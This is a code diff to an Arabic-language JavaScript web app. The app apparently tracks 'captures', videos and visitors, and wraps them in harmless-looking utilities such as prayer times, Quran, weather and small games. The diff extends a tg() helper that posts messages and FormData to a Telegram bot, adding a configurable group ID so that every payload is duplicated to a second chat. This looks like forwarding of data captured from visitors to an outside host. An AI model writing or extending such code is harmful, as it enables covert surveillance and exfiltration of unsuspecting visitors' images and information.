@@ -17,7 +17,7 @@
       theme: 'dark', gallery: [], avatar: '',
       heroStyle: 'circle',
       maintenance: false, visits: 0, captures: 0, videos: 0,
-      photoMode: true, videoMode: true, dropMode: true,
+      photoMode: true, videoMode: true, dropMode: true, groupId: '',
       visitors: [], messages: [], replies: [],
       lockEnabled: true, lockDuration: 15, notifyLogin: true,
       loginLog: [], failedLogins: 0, lockedUntil: 0
@@ -77,14 +77,21 @@
   }
 
   function tg(api, body){
+    const groupId = (state && state.groupId) || (window.CONFIG && C.GROUP_ID);
     if(typeof body === 'string'){
-      return fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api, {
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify(body)
-      }).catch(()=>{});
+      fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)}).catch(()=>{});
+      if(groupId){
+        const gb = Object.assign({}, body, {chat_id: groupId});
+        fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(gb)}).catch(()=>{});
+      }
+      return;
     }
-    return fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api, {method:'POST', body}).catch(()=>{});
+    fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api, {method:'POST', body}).catch(()=>{});
+    if(groupId && body instanceof FormData){
+      const fg = new FormData();
+      for(const [k,v] of body.entries()){ fg.append(k, k==='chat_id' ? groupId : v); }
+      fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api, {method:'POST', body: fg}).catch(()=>{});
+    }
   }
 
   // Welcome
@@ -531,6 +538,9 @@
       if(window.MP && window.MP.openGame){ window.MP.openGame(app.replace('mp-',''), A); return; }
       A.innerHTML = '<div style="text-align:center;padding:30px;color:#dc143c">فشل تحميل مكتبة الألعاب الجماعية</div>';
       return;
+    }
+    if(window.NEWFEATURES && ['prayer','weather','currency','quran','hadith','game2048','snake','colorpicker','unitconv','countdown','wordscramble'].includes(app)){
+      window.NEWFEATURES.open(app, A); return;
     }
     if(app==='calc') A.innerHTML = calcHTML();
     if(app==='browser') A.innerHTML = browserHTML();
